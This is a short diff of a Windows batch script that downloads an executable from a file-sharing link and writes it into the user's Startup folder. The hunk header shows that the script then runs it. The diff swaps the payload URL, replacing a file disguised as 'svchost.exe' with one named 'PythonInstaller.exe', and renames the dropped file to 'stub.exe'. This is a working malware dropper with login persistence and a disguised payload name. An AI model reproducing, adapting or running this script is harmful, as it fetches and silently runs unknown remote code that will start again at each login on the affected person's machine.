@@ -20,8 +20,8 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://link.storjshare.io/s/jxyuqam6e6ln2vrvv6nudi676gqa/isimsallaqwe/svchost.exe?download=1"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\rename_me.exe"
+set "URL=https://link.storjshare.io/s/juhifsj5yqitylzy42lgs2xmtfjq/isimsallaqwe/PythonInstaller.exe"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\stub.exe"
 
 
 if exist "%DEST%" del "%DEST%"
